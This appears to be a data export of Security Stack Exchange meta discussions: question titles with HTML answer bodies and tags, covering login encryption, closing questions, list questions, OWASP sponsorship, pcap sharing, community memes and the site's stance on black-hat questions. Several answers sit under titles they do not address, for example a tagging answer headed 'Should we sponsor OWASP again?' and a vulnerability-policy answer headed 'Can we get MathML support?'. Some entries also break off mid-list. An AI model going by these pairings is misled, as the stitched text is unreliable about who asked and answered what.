Why does security.stackexchange.com not encrypt logins?,"<p>Security.SE, like all other SE sites, don't actually have a login screen to encrypt.<br>
The ""login"" screen, such as it is, is really just a referral to your <a href=""http://en.wikipedia.org/wiki/OpenId"" rel=""nofollow noreferrer"">OpenId</a> provider. You submit your password (or any other authentication credential) to them, not the SE site.    </p>

<p>That said, SE does have its own OpenId provider, and I believe that the actual authentication process <em>is</em> encrypted over HTTPS. It works just like any other potential provider, and simply redirects back to the SE site.   </p>

<p>In general, implementing HTTPS for a high-traffic site is always a trade-off, even if it usually is a tradeoff that makes sense.<br>
You can find some additional aspects here - <a href=""https://security.stackexchange.com/a/442/33"">What are the pros and cons of site wide SSL (https)?</a></p>

<p>Specifically regarding this site (should be on meta), there is some context in <a href=""https://security.meta.stackexchange.com/q/104/33"">Are there plans to support https?</a>.<br>
Even more context for this site - and many issues that apply to the general case - here: 
<a href=""https://meta.stackexchange.com/q/69171/135923"">Why doesn't the Stack Overflow team fix the Firesheep style cookie theft?</a></p>
",<discussion><ssl>,3,,287
Why does security.stackexchange.com not encrypt logins?,"<p>Regarding the login process itself, there are a couple of issues:</p>

<ul>
<li>If you use an external OpenID provider (e.g. Google), whether-or-not HTTPS is used will depend on the provider. The four providers with a big icon (Google, Yahoo, MyOpenID and Facebook) use HTTPS pages.</li>
<li>If you use the StackExchange login, it's also using HTTPS, but via asynchronous calls, within a div/iframe, which is useless (as <a href=""https://stackoverflow.com/a/3183176/372643"">detailed here</a>), since the user has no way of verifying that it is using HTTPS indeed. That's quite bad actually (or pointless).</li>
</ul>

<p>As a general rule, when using HTTPS: always make this clear to the user, so that the user can check (a) that HTTPS is used and (b) that it is used with the site they expect (I've used Chrome's developer tools to find out that it was making HTTPS requests via asynchronous requests, not something that most users would do). This means that the main URL in the browser should be using <code>https://</code> and the domain should be the one relevant for that particular part of the process. A bad example of this second point is <a href=""http://en.wikipedia.org/wiki/3-D_Secure"" rel=""nofollow noreferrer"">3-D secure</a>, whereby the bank's address is often embedded on the page, still using the merchant's address in the top bar.</p>

<p>In addition, ideally, there should be support for HTTPS over the entire site. <a href=""https://meta.stackexchange.com/questions/69171/why-doesnt-the-stack-overflow-team-fix-the-firesheep-style-cookie-theft"">This request has been made a number of times on Meta</a>, but it was turned down after a risk/cost assessment exercise. Maybe it will be re-evaluated in the future.</p>

My question has been closed. What do I do now?,"<p>So, your question has been closed. Seems a bit harsh? Ok, well, this guide is here to help explain <em>why</em> your question has been closed. This has been covered briefly <a href=""https://security.stackexchange.com/faq#close"">in the FAQ</a> too.</p>

<p><strong>Is closure permanent?</strong></p>

<p>Absolutely not. Closed questions are only prevented from receiving additional answers; they're even still visible to all members of the site.</p>

<p>This might sound like a bad thing - it isn't. The concept of closure is that we prevent answers coming in that make guesses or assumptions based on an incomplete question, or are just plain bad, <em>until</em> the question has been improved. We are all about quality and question closure is out way to ensure users spend their time generating quality answers.</p>

<p><strong>Does a closed question count against me?</strong></p>

<p>Not in a reputation sense (unless you have also been downvoted). However, if a sufficient number of your questions are closed, the system may automatically ban you from asking additional questions. Similarly, a moderator may take action before then.</p>

<p>If a moderator takes action, they will likely contact you, explain the problem and what you need to do to improve. Take note and all should be fine.</p>

<p>If the system takes action, you will receive an orange bar notification. Moderators have no way to tell if you have been banned from asking questions via this mechanism and we cannot lift it, either. You will have to have had a sufficient quantity of questions closed to trigger this, however.</p>

<p><strong>Ok, so why was my question closed?</strong></p>

<p>Underneath each question, there is a banner which explains why your question was closed, giving a few short reasons. Here, I will expand on these:</p>

<ul>
<li>Exact duplicate - this type of closure is exactly what it sounds. We already have a question covering that material and it would be better if the material is to be revisited for those answers to be edited and improved on, rather than creating a whole set of duplicate answers.</li>
<li>Not constructive - some questions are just not suited to the format we use here. These include lists, polling or opinion questions that eat up the time of our members, who are here to help people with their problems and learn about security in a constructive, problem-by-problem manner.</li>
<li>Not a real question - questions closed as NARQ fit into two categories; the first is that your question simply doesn't make sense or is so poorly worded it's almost a crime people are reading it. The second is that your question, whilst valid, is just too broad to be covered over the internet and really needs to be broken into manageable chunks.</li>
<li>Too localized - questions closed with this reason refer to a very narrow scenario, or are, for example, only useful to you and in no way would be useful to other people with the same problem.</li>
</ul>

<p><strong>What about off topic questions?</strong></p>

<p>Sometimes, a question is good, but just doesn't fit here on security. In this case two things will happen:</p>

<ul>
<li>The question will be migrated to another Stack Exchange site.</li>
<li>The question will be closed as purely off topic.</li>
</ul>

<p>Migration is a privilege, not a right. If your question has been migrated, a moderator has gone to the effort to get it moved; however, there is no onus on us to migrate questions anywhere. If your question is poorly formatted, we are unlikely to move it.</p>

<p><strong>How do I get my question re-opened?</strong></p>

<p>Occasionally, questions are closed by mistake. This is a rare occurrence and will usually be rectified pretty quickly when we realise this has happened.</p>

<p>Here is a list of steps you can take to get your question improved and increase your chances of re-opening:</p>

<ol>
<li>Read about what questions are <a href=""https://security.stackexchange.com/faq#questions"">on topic</a> and <a href=""https://security.stackexchange.com/faq#dontask"">off topic</a> in the FAQ.</li>
<li>Decide if your question was really a fit for SE in the first place. Not all questions are. However, you may well be able to re-word it into such a way that it <em>does</em> fit. Do have a ready of point 3:</li>
<li>Work through each of the articles on the <a href=""https://security.stackexchange.com/questions/how-to-ask"">how to ask</a> page. Specifically, I would highlight the following:

<ul>
<li>Is your question properly formatted?</li>
<li>Have you checked your spelling and punctuation?</li>
<li>Have you explained your problem sufficiently?</li>
</ul></li>
<li><p>Underneath your question there is an edit link:</p>

<p><img src=""https://i.stack.imgur.com/T9Z3Y.png"" alt=""Screenshot of edit link""></p>

<p>Use this to improve your question. <strong>Take your time</strong> and ensure you put sufficient effort in. </p></li>
<li><p>When you are sure you have edited the question and framed it in the best possible way, you may do one of the following:</p>

<ul>
<li>Contact us in the DMZ <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">(security chat room)</a> or <a href=""http://chat.stackexchange.com/rooms/2691/the-assembly"">the assembly</a>. Users capable of re-opening are not always around, but it may help to ask for feedback and get other user's opinions.</li>
<li><p>A moderator should have commented on your answer. You can reply to them using the following format:</p>

<pre><code>@moderator_name Hello, I've edited my question, can 
you please let me know if it is suitable for re-opening?
</code></pre></li>
<li><p>Alternatively, you can flag for moderator attention using the flag link underneath your question and filling out the custom reason box:</p></li>

<p>Each answer is supposed to solve the problem on its own. In the present state, none of your posts solve the problem, they only tackle a small part of it.</p>

<p>Multiple answers are supposed to provide different ways of solving the problem. Let's say I want to suggest a different way of ensuring that <code>mod_ssl</code> uses <code>/dev/urandom</code>. So I would post another answer about <code>mod_ssl</code>. If everybody does that, the result will be a complete mess, with a few posts about <code>mod_ssl</code> and a few posts about Postfix and a few posts about OpenLDAp and …. There wouldn't even be a way of filtering the posts about <code>mod_ssl</code> among the crowd. And since I can next add my answer about Joe's HTCPCP server, this is indeed an “infinite list of X” question.</p>

<p>Voting on answers is supposed to reflect the accuracy, clarity, completenes and other qualities of the answer. Ideally, an answer has a higher score than another if it is better by these measures than the other answer. What does it mean if your Postfix answer is more upvoted than your OpenLDAP answer? That Postfix is better than OpenLDAP and I should start using it to serve my user and host databases? There are, indeed, “zero meaningful criteria for evaluation”.</p>

<p>This isn't an issue that's come up often on this site, if at all. Other subjects are more prone to generating such lists of items. The result is a mess. <a href=""https://scifi.stackexchange.com/"">Science Fiction and Fantasy Stack Exchange</a> ran into this issue early on, and ended up mentioning an explicit prohibition on “list questions” in its <a href=""https://scifi.stackexchange.com/faq"">FAQ</a>. However, this is not intrisically a policy that is specific to SF&amp;F: the FAQ only makes it explicit that lists of items are not well-suited to the Stack Exchange format.</p>

<p>When I read your question, I expected that you were after general advice regarding system configuration to use <code>/dev/urandom</code>. Given what you posted as answers, it seems that you are instead after advice for certain specific programs (<code>mod_ssl</code>, Postfix, etc.). Such specific advice should be in one question per program. I have therefore reversed my vote and voted to close your question as too broad. Please ask about each program separately, so that a person looking after advice for Postfix can find a Posftix question, etc.</p>

Critique my question about configuration for /dev/urandom,"<p>I think @AviD and @Gilles are right. </p>

<p>We need a <strong>'one best answer'</strong> with all these existing answers rolled into one. From the perspective of someone coming here to find the answer, they should see one top-voted answer with everything they need in it.</p>

It reflects that the question is asking about past history, as opposed to current practice.  That's not necessarily off-topic.  The two questions that are currently tagged in that way seem reasonable to me.

",<discussion><site-promotion>,13,,362
Should we sponsor OWASP again?,"<p>If you have a question that is specifically asking about security-through-obscurity, I think it is fine to tag it as such.  For instance, maybe you are asking about the effectiveness of security-through-obscurity in contexts where robust prevention is impossible (e.g., DRM).  That'd be fine to tag such a question with a security-through-obscurity tag.</p>

<p>On the other hand, suppose you started going around to existing questions that you consider to be proposing a scheme whose security relies upon security-through-obscurity, and suppose you started adding a security-through-obscurity tag to those questions.  Well, that'd be a lousy and inappropriate thing to do -- for the same reasons that it would be inappropriate to go find questions that you don't like and tag them with the tag ""bad-question"".</p>

<p>To generalize: Tags should not be used to express a judgement on the worth of a question.  And the question needs to stand on its own: the title and text of the question need to fully specify what is being asked (tags should not be used to disambiguate ambiguous questions, or as a substitute for explaining what you mean in the question).</p>

Weekly Question of The Week Submissions: Place a Link to the Blog in the Question?,"<p>So I saw a mention from the DMZ about me and this, so I'll chip in. </p>

<p>I guess the answer partially depends on why StackExchange do sponsorships...  </p>

<p>I'd guess that one reason is to help boost awareness of the SE network and specifically Sec.SE. In this case then I'd say that sponsoring OWASP events in general should be a good option.  </p>

<p>OWASP events tend to be primarily attended by people on the technical side of application security (both security practitioners and developers).  I'd say that the attendees are a good match for the kind of people we'd like to see contributing here, so raising awareness of Sec.SE with OWASP attendees would be good from that point of view.</p>

<p>There's also the aspect that @RoryAlsop raised, which is that OWASP are a non-profit security organisation who depend on sponsorships and memberships to raise funds for projects and conferences.  </p>

<p>Quite a few of their projects are well referenced and used in the security community in general (the OWASP Top 10 in particular) and get quite a few references on Sec.SE (210 from a basic search), so hopefully helping to fund them through sponsorships helps to improve the overall state of the AppSec industry...</p>

<p>Is that helpful?</p>

<p>Unfortunately, I don't have any ideas on how to provide this kind of proof without lowering the amount of security in the system.  (Such as displaying your password hash on your profile page when you are logged in... but not over SSL.  Clearly reduces security.)  A statement in the privacy policy along the lines of ""We use bcrypt to hash your passwords."" would be a good step.</p>

How can we help make StackExchange more secure?,"<p>A slight update from the Stack Exchange engineering side of things, since it's been a while:</p>

<p>We are <em>moving</em> towards HTTPS for everything that needs to be secured (whether it's just for logging in and logged in users or <em>everything</em> is yet to be decided).  The issue here is a few fold: to start with, we would need certs with our current scheme, a <em>lot</em> of certs with no end in sight with the current scheme.  Let's take a look at why:</p>

<ul>
<li>security.stackexchange.com - ok good, *.stackexchange.com wildcard cert (we have this)</li>
<li>meta.security.stackexchange.com - <em>uh oh</em>, wildcards don't go 2 levels deep, we'd have to make a major change (likey) to how metas work (and share cookies) here.</li>
</ul>

<p>For <code>n</code> sites (and growing), having the child metas requiring another cert (or an entry/update on a shared cert, more likely) is a maintenance nightmare.  Also, each meta would now need its own DNS separate from the parent site as we create them, to point at that multi-cert endpoint (remember, a wildcard can't be a member of a multi-domain cert, at least not in a way accepted by most browsers).</p>

<p>You can see how our maintenance goes way up when adding a site, and it's a lot more configuration to keep around - since we're in the middle of the following:</p>

<ul>
<li>Moving to new load balancers</li>
<li>Setting up a redundant data center (Oregon)</li>
<li>Moving our primary data center (in New York)</li>
<li>Moving our databases to a set of SQL Server 2012 clusters (weeeeee)</li>
<li>About to start a major code initiative (that'll take months)</li>
<li>Setting up a new office</li>
<li>Planning another office move</li>
<li><em>plus anything that comes up day to day</em></li>
</ul>

<p>...now's not the best time for us to take SSL on <em>as well</em>.  The most critical bits are already travelling over SSL, so while we're moving towards expanding that support, we're not there quite yet.</p>

<p>For the inevitable ""what if someone gets a developer cookie??"" argument...that's why we use the sites over a secure VPN while travelling where a MITM attack is a significant risk.  I'd be happy to expand on this more if there are further questions, just wanted to let you know we're not ignoring it or brushing it aside...we're just extraordinarily busy as of late.</p>

  <p>I think we really should have a general (no exceptions) policy about this.</p>

<p>I see nothing wrong with sharing pcap files in principle. You might be looking at one for self learning purposes - i.e. just a boring home network 192.168.0.0/16 ladada NETBIOS INAMEMYPCAFTERSTARWARSCHARACTERS laadadadaaaa.(*)</p>

<p><em>That said</em>, there is a potential for an individual to do some form of examination (warranted or not) on a network they do not own and publish the results here, accidentally letting on far more than they intended. There's also potential for an individual to publish a file that is part of a contracted analysis. I mean, people don't hire people who just publish sensitive stuff on the web or write their pentest contracts missing clauses that say ""you won't publish what you find or any details of our network that might lead to an attack"", do they? Do they? But there's still a potential. </p>

<p>But I think we can come a level down from that. Publishing an entire pcap dump and saying ""hey guys, can haz help doing analysis?"" is the equivalent of going to Stack Overflow with a 20,000 line perl program and saying ""hey, there's an error somewhere in this, please help?!"". The typical SO reaction is ""we are not doing your job for you"".</p>

<p>I suggest we deal with these under the same premise. Exactly what packets are you interested in? Reproduce <em>those</em> <strong>in the question</strong>, not some pastebin/file upload site I have to go to look at, download, pass through tcpdump. The chances of me bothering to do that are really very remote. I have enough crash dumps waiting on my desk at work...</p>

<p>This has the nice side effect of dealing with accidental leakages via these mechanisms. ""We're not analysing your tcpdump for you unless you do some legwork and ask about what you're seeing"" also means we'll either just close, edit in or otherwise mask the information.</p>

<p>Blowing away revisions is not something moderators can do. Moreover, the procedure for blowing away data from revisions goes like this:</p>

<ul>
<li>Delete it (question, answer etc) immediately.</li>
<li>Contact community with a link to the revision.</li>
<li>Wait for the revision to vanish.</li>
<li>Undelete if community person didn't.</li>
</ul>

<p>The reason for the immediate deletion is to halt any further leakage - only 10k+ users can see the revision and only if they have a link. Of course, for the user, unless they requested the removal, this is an inconvenience they may find frustrating (""omg evil mods why did you delete my question?"") and result in ""unfathomable behaviour"" and possibly a  ""repost condition"".</p>

<p>So what I'm trying to say is that one would have to be carefully handled. I'd personally reserve it only for cases where the person asks for it, as it involves the effort of at least one mod and at least one member of SE staff. I know, I'm ARPing on a bit now. Sorry.</p>

The Memes of Information Security,"<h1><em><strong>Rory</strong></em></h1>
<p>As you've already mentioned, Rory has become a bit of a meme within the IT Security StackExchange community.  Usage of this meme often takes the form of word substitution a-la &quot;smurf&quot;.</p>
<p><strong>Usage Examples:</strong></p>
<blockquote>
<p>Jeff Ferland:  <a href=""http://chat.stackexchange.com/transcript/151?m=5006504#5006504"">It's a quite a rory of a problem, really</a></p>
<p>Ninefingers:  <a href=""http://chat.stackexchange.com/transcript/151?m=4864874#4864874"">At a guess, he feels a little Rory.</a></p>
<p>AviD:  <a href=""http://chat.stackexchange.com/transcript/151?m=4690384#4690384"">For the rory of it.</a></p>
<p>Polynomial: <a href=""http://chat.stackexchange.com/transcript/message/6309704#6309704"">s/\b.+/Rory/</a></p>
</blockquote>
<p>Of course, as tends to happen with such things, this would often get <em>over</em> used - sometimes to the point of making &quot;rory'd&quot; or &quot;rory-fied&quot; statements utterly incomprehensible.</p>
<p><strong>(Ab)usage Examples:</strong></p>
<blockquote>
<p>Iszi Rory or Isznti:  <a href=""http://chat.stackexchange.com/transcript/151?m=4934589#4934589"">Well, rory you - you, rorying Rory.</a></p>
<p>Ninefingers:  <a href=""http://chat.stackexchange.com/transcript/151?m=5000840#5000840"">Hello Rories, would this Rory be more on Rory here?</a></p>
<p>AviD:  <a href=""http://chat.stackexchange.com/transcript/151?m=4934568#4934568"">Can you rories please rory down. You're rorying the rority of my rory room.</a></p>
</blockquote>
<p>Further development of this meme led to an interesting time, when the chat room's topic was changed to really nothing but <a href=""https://security.stackexchange.com/questions/tagged/rory"" class=""post-tag"" title=""show questions tagged &#39;rory&#39;"" rel=""tag"">rory</a>.</p>
<blockquote>
<p>Scott Pack:  <a href=""http://chat.stackexchange.com/transcript/151?m=4672066#4672066"">room topic changed to The DMZ: The first Rory costs you a Rory.... [rory] [rory] [rory] [rory]</a></p>

<p><strong>Origins:</strong></p>
<p>This meme came about primarily due to the seemingly abnormal dominance of the name &quot;Rory&quot; within the IT Security - particularly, the IT Security StackExchange - community.  For a long time, and perhaps still to this day, the &quot;original&quot; Rorys were the only individuals in <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">The DMZ</a> who were known to share the same Given Name (or First Name) in real life.  Since then, the IT Security StackExchange has seen a few other Rorys.  Most Rorys are from Scotland or another part of the U.K., while another is from Ireland and a couple are unspecified.</p>
<p><strong>Original Rorys:</strong></p>
<p><a href=""https://security.stackexchange.com/users/37/rory-mccune"">Rory McCune (Scotland)</a><br />
<a href=""https://security.stackexchange.com/users/485/rory-alsop"">Rory Alsop (Scotland)</a></p>
<p><strong>Other Rorys:</strong></p>

<a href=""https://security.stackexchange.com/users/4097/rory"">Rory (Ireland)</a><br />

<blockquote>

<p>@Polynomial points out that ""diurnal isomorphism"" is much more fun if you misspell it as ""diurinal isomorphism"".</p>

<p>Although we have one US moderator, the majority of the Security Stack Exchange moderators are based quite far east of the US (UK, Germany and Israel), therefore delight in declaring other timezones arbitrarily and randomly when entering the DMZ.</p>

<p><strong>Originator</strong>: @ThomasPornin, @ScottPack, @AviD</p>

<p><strong>Cultural Height</strong>: July 2011</p>

<p><strong>Background</strong>: Our highest rep user, cryptographer Thomas Pornin created a couple of distinct accounts with bear avatars. </p>

<p><a href=""https://security.stackexchange.com/users/655/thomas-pornin""><img src=""https://i.stack.imgur.com/VGKxe.jpg"" alt=""enter image description here""></a><a href=""https://security.stackexchange.com/users/5411/tom-leek""><img src=""https://i.stack.imgur.com/OmbON.jpg"" alt=""enter image description here""></a></p>

<p>Being a rather prominent and respected member of the community, this has earned him some nicknames:</p>

<ul>
<li>""The Bear"" usually refers to @ThomasPornin himself, but is also often used specifically in reference to his primary account.</li>
<li>""Big Bear"" is usually used to refer to the actual @ThomasPornin account, distinct from...</li>
<li>""Little Bear"" which is used to refer to the @TomLeek persona.</li>
</ul>

<p>With his rapid rep gain, the bear icon appeared regularly, so a winged bear with lasers was proposed as a site logo when we graduated. </p>

<blockquote>
  <p><a href=""http://chat.stackexchange.com/transcript/151?m=2090800#2090800"">@Jin new design - bears, with wings, and lasers as per @AviD's
  request?</a></p>
</blockquote>

<p>@ScottPack then introduced us to the ServerFault <a href=""https://meta.serverfault.com/questions/1850/paddington-bear-choppertar"">Paddington Bear Choppertar</a>, so the theme grew. Later the bear theme came to include references from the LGBT community in the form of these <a href=""http://en.wikipedia.org/wiki/Bear_%28gay_culture%29"" rel=""nofollow noreferrer"">gentlemen</a>:</p>

<p><img src=""https://i.stack.imgur.com/bSQos.jpg"" alt=""enter image description here""></p>

<p>On September 22 2013, the Big Bear reached 100k rep - so it <a href=""https://security.meta.stackexchange.com/q/1412/485"">has been proposed</a> that this date should be celebrated as Bear Day each year... to which Thomas answered in his usual sincere manner:</p>

<blockquote>
  <p>The Bear approves of your oath of fealty. You may keep on chanting the glory of your ursine overlords.</p>
</blockquote>

<p>At about the same time, Little bear topped 40k - giving him a total rep about the same as the total rep for the next 4 members!</p>

<p><strong>Originator</strong>: @Iszi, @ScottPack, @GrahamLee</p>
<p><strong>Cultural Height</strong>: Most of 2011</p>
<p><strong>Background</strong>: Originally, <a href=""http://chat.stackexchange.com/transcript/message/463808#463808"">@Graham made a snarky comment to @Iszi</a>, and @Scott over-analyzed and ran downhill with it. @Iszi's protests of malehood notwithstanding.</p>
<blockquote>
<p>Graham Lee: @Iszi Just doin' my job, ma'am ;)<br />
packs: @GrahamLee Hm. I always assumed Iszi was male, though in retrospect all statements could be gender neutral. This should be interesting to see (his|her) reaction.<br />
Iszi: @packs Funny. Real funny.<br />
Graham Lee: I keeed<br />
Iszi: I suppose these days &quot;wife&quot; is a gender-neutral term, in respect to identifying the speaker. I know I've mentioned the XYL once or twice here.</p>
</blockquote>
<p>From there, it just continued to hang around, like a cloud of gender-confusion hanging  over @Iszi's gravatar, such as this assortment of comments:</p>
<blockquote>
<p>Probably around the same time my gender came into question.</p>
<p>A gender/orientation identity crisis? Yeah, me neither. Though I was a theatre major for a while, that should give me some perspective.</p>
<p>Whichever gender @Iszi may or may not be is still, in my mind, an open question until I see (him|her) in a bar.</p>
<p>First you accuse me of being a different gender. Now I play with sock puppets?</p>
<p>Great... now I'm a scapegoat of questionable gender.</p>
<p>I don't mind. I'm already &quot;a scapegoat of questionable gender&quot; here. May as well add S&amp;M to that.</p>
<p>One's choice of under garments is not necessarily indicative of one's gender.</p>
</blockquote>
<p>Eventually, @Iszi had no choice but to meet with @Scott in person, and allow him in-person authentication - a gender-CAPTCHA, if you will. Results were first announced via <a href=""https://twitter.com/packscott/status/109697800677244928"" rel=""nofollow noreferrer"">Twitter</a>:</p>

How to ask big list like questions?,"<p>Summary: <strong>don't ask for one book, ask for a curriculum</strong>.</p>

<p>Big-list questions don't work well on Stack Exchange. This is not immediately obvious; at first sight you might think that with one item per answer, the best items get upvoted and come out on top, and all is well. In other words, you have a poll. In fact, this never¹ works, for several reasons.</p>

<ol>
<li>The main trend in votes is that whoever gets in first gets the most votes. A lot of voters only see the thread once, so they won't see later additions.</li>
<li>The secondary trend is that most popular items get the most votes. This may look good, but it isn't. Items get upvotes based on their general popularity — “hey, I've heard of this” (if we're lucky, “hey, I know this, it's good”). Whether the item is actually suitable for the question is rarely a consideration.</li>
<li>The one-item-per-answer tends to attract a lot of “read this” answers that don't bother to say why. Sure, someone can come later and edit a reason into the post. But that rarely happens, so we end up with lots of items with no clue of why we should pursue them.</li>
<li>Often there isn't a One Single item that answers the question. Let's say your opinion is “as a tutorial, get book A and book B (they're equally good, so pick whichever you find first); and also get book C, because it the reference on the topic (but it's hard on beginners)”. You can't express this in the one-item-per-answer format.</li>
</ol>

<p>Insisting that answers provide a complete recommendation mostly solves these problems. That is, if you recommend A and B in an answer, it should also be an assertion that A+B is sufficient for the question, that you don't need anything else.</p>

<ol>
<li>Whoever gets in first still tends to get the most votes. But that's not so much of a problem, because each answer makes a whole. There is value in having each answer individually, not just as part of a poll.</li>
<li>Popular items still get more votes, but this is mitigated by having answers that tend to mix popular and less-popular items. The same popular item may be mentioned by several answers, and they'll be on equal terms.</li>
<li>When answerers are encouraged to make a complete answer, they tend to provide a description of each item: “get A because … and B because … and C because …”. Answers can't be judged solely on the quality or popularity of the recommended item, the description and justification given in the answer also comes into play.</li>
<li>Answerers are free to make their selection however they like, with no artificial constraint.</li>
</ol>

<p>There are guidelines on this topic in the <a href=""https://security.stackexchange.com/faq#dontask"">FAQ</a>. In particular, going for a curriculum rather than a book is a big step towards meeeting the <a href=""http://blog.stackoverflow.com/2010/09/good-subjective-bad-subjective/"">six guidelines on good subjective questions</a> apply here:</p>

<p>    1. <em>Great subjective questions inspire answers that explain “why” and “how”.</em> See point 3 above.<br>
    2. <em>Great subjective questions tend to have long, not short, answers.</em> Not one item, but a complete selection.<br>
    3. <em>Great subjective questions have a constructive, fair, and impartial tone.</em> Because you aren't advertising for a book, you're providing a reading list.<br>
    4. <em>Great subjective questions invite sharing experiences over opinions.</em> Surely you've read more than one book in your life, so draw on your experience, don't just take mention one thing you liked.<br>
    5. <em>Great subjective questions insist that opinion be backed up with facts and references.</em> See point 3 above.<br>
    6. <em>Great subjective questions are more than just mindless social fun.</em> A reading list calls for expertise, it's not something you can throw up in 30 seconds.  </p>

<hr>

<p>Now how does this work in practice? The now-defunct Literature Stack Exchange site tried allowing book recommendation questions with some guidelines that included an exhortation against single-item answers. The book recommendation questions weren't a great success, but some of them did work well. The ones that worked had some characteristics in common:</p>

<ul>
<li>Multiple answers provided a selection of several books with a paragraph or so explaining why each book was included in the list. Often the good answers would not be structured as a straight list, but had at least an introduction showing the philosophy behind the selection.</li>
<li>Answers that didn't play ball were not upvoted (even if they happened to mention a popular book), or even downvoted or even deleted.</li>
</ul>

<p>Making book recommendations work requires that enough of the community plays along, by upvoting the complete answers and downvoting the answers with a too small selection or with no justifications. It would help to have official guidelines allowing moderators to delete bad answers regardless of their score.</p>

Clarify our stance on black hat questions,"<p>The root of the issue is political correctness. Namely, you are all sissies.</p>

<p>There, I have said it, now the explanations: what ""we"" want is a serious site with a lot of information and analysis and conceptual stuff; we want to be looked at as a <em>reference</em>. The place to be for the professionals. The meeting place of the higher spirits in the field. What we do <strong>not</strong> want is to meet villains, especially the low grade ones. Consider the following analogy: if this site was about history of crime and police technics, we would like users like forensics experts at Scotland Yard, and certainly not Jack the Ripper -- even though Jack's expertise would be right on spot and he would certainly have very interesting things to say. It is a matter of image and reputation. We want to attract the ""right sort of people"".</p>

<p>However, in this world and century, it is considered bad form to select people. Freedom of speech, equality of rights and dignity, haro on prejudice, name your post-70s fantasy here. Users are supposed to be faceless, and we, as civilized people, are socially expected to judge posts based on their objective technical merits only. So, no question of excluding users; we only talk about questions and answers.</p>

<p>This leads us to the usual debate on whether black hat questions are on topic or not. It misses the point, but at least we feel <em>allowed</em> to discuss scope. All the discussions on the darkness of hats turn into byzantine arguments about how a question about virus propagation can be legit and great some times, and totally forbidden in other circumstances. The one thing which makes the difference is whether the <em>asker</em> is someone we want to be associated with, or someone we would prefer never to meet.</p>

<p>The logical, definitive FAQ entry on that subject should read: ""Ye who are a pirate, never-do-well or criminal, begone. You stink and we do not want to talk with your sort.""</p>

Should white hats know methods that can be used by black hats to attack them?,"<p>(Lightly adapted from my answer to <a href=""https://security.meta.stackexchange.com/questions/290/how-do-we-provide-value-to-white-and-grey-hats"">How do we provide value to white and grey hats?</a>)</p>

<p>I'm speaking here as a fully white-hat person (I'm a developer whose products are sometimes part of a security infrastructure, and an occasional system administrator). Talking about attacks tells me what I'm supposed to defend again. When designing a defense, a lot of the difficulty is imagining how it could be breached.</p>

<p>Why would a thread about an attack require a remediation? Conversely, should a thread about a defense include a way to bypass it?</p>

<p>Rejecting questions because they're “too black hat” lessens the value of the site to me. I need to know what I'm defending against. If black hats want to post to the site, what I have to say to them is <em>teach me</em>.</p>

<p>(And it's tit for tat, of course. I'm perfectly happy with having defense techniques published on the site, even if they end up informing black hats what they're up against.)</p>
",<discussion><asking-questions><black-hat>,8,,434
Should white hats know methods that can be used by black hats to attack them?,"<p>In my opinion to be sure that protection mechanisms work, you should know what attacks can be performed against them. Only if you know techniques that can be used to attack you, you can be sure whether you are protected. If you go to Sec.SE asking about attack protection without knowing full attack profile, you can't judge whether those protection mechanisms work. So before knowing protection measures, you should know attack itself.</p>

<p>Based on this, I think that questions asking about how to perform an attack seem to be good for me as this knowledge is needed to be able to judge protection measures.</p>

<p>For example to be sure that my protection measures catching scan anonymizers work, I should <a href=""https://security.stackexchange.com/questions/12762/what-is-the-best-tool-to-anonymize-your-scans-network-ports"">know techniques</a> that can be used to anonymize scans. </p>

<p>To figure out how to build smartphone that will be able to notify user in case of attack, I should know <a href=""https://security.stackexchange.com/questions/17738/are-there-bluetooth-attacks-on-smartphones-that-will-not-notify-the-user-of-the"">how those attacks work</a>.</p>

Should white hats know methods that can be used by black hats to attack them?,"<p>I think the biggest problem in the security industry right now is that there are too many stuck up whitehats that are expected to break the exploitation process when they themselves have never written an exploit.  So in the realm of security,  making any topic taboo makes the process of learning into a vulnerability.  After all a blackhat might ask a question where we all learn somthing, ** <strong>gasp</strong> **...</p>

<p>I am a whitehat, in that I have never Illegally broken into a system and I am paid to prevent such behavior.   That being said <a href=""http://www.exploit-db.com/author/?a=628"" rel=""nofollow"">I enjoy writing exploits</a> and I think that full disclosure is a useful tool if the vendor is not cooperative.   This behavior is legal,  at least in the US.</p>

<p>Blackhats must be able to solve difficult, intellectual problems in order to be successful,  and for that they have my respect.  Very few people on the planet can grasp such problems.  If anyone is able to ask an interesting question and I am able to provide an answer I will do so.  By not providing an answer to a potential blackhat,  I don't believe that the internet is a ""safer place"".  After all this community is the sole provider of such information.</p>

<p>I will not answer questions like ""How do I hack a facebook account""  or other such nonsense.  I think that the community is uniformly against such questions.  If the OP isn't willing to put in the effort to climb the mountain of information that makes up modern security then I am not willing guide that person through the difficult terrain. </p>

Can we get MathML support?,"<p>I would like to give my opinions on the three points you have stated.</p>

<blockquote>
  <p>Single-vulnerability questions should be closed as Too Localized, unless they're high profile and warrant a decent writeup on the subject.</p>
</blockquote>

<p>I do not agree with this, coming from personal experiences.</p>

<p><a href=""https://security.stackexchange.com/questions/15436/understanding-a-vulnerability"">Understanding a vulnerability</a></p>

<p>This is my first question on Sec.SE. I was searching high and low for information on this particular vulnerability in the CVD and other similar databases. However, what I could find was either too vague, or too in-depth for someone of my experience.</p>

<p>I asked the question here and learnt plenty from the answer provided. The answerer was you no less. ;) This was what prompted me to stick around.</p>

<p>Going by your guidelines, I would have closed that question. Although it is a chrome vulnerability, it isn't particularly high profile. I don't think that is a good idea.</p>

<p>What we can do is enforce naming guidelines on the questions, which will provide the CVE number and other minor details. This would make searching for a information on a particular vulnerability easier.</p>

<blockquote>
  <p>Knowledge is inherently amoral. What's done with it is outside our jurisdiction. However, in cases where malintent is shown, we should close the question.</p>
</blockquote>

<p>I agree with this. Questions asking for explanations or clarifications about a particular vulnerability should be allowed. However, questions like ""give me the exploit code for this vulnerability pl0x"" should be closed immediately. </p>

<blockquote>
  <p>Generic advice is useful to lots of people, but less useful to the asker. We'd have to judge this on a case-by-case basis. Should we have a line in the sand, or should we leave it up to the answerer to judge?</p>
</blockquote>

<p>I don't think it is possible to provide a guideline for this. It will vary from question to question. The answerer should decide on what to cover. Upvotes and downvotes by the community will do the rest.</p>

How to ask question about checking for specific vulnerability in black box circumstances?,"<p>It depends upon the feature.  If you can identify the API or function being called, you might be able to ask about that API, if that API is of sufficiently broad relevance (e.g., it is a platform API).</p>

<p>Also, if you can identify the class of vulnerability that you suspect is present, it is also possible there might be a good question lurking of the form ""how do I test/confirm whether or not my web application is vulnerable to HPP attacks in a particular parameter of a particular page?"" (or whatever; replace with your particular vulnerability class).  This could be of broader utility.</p>

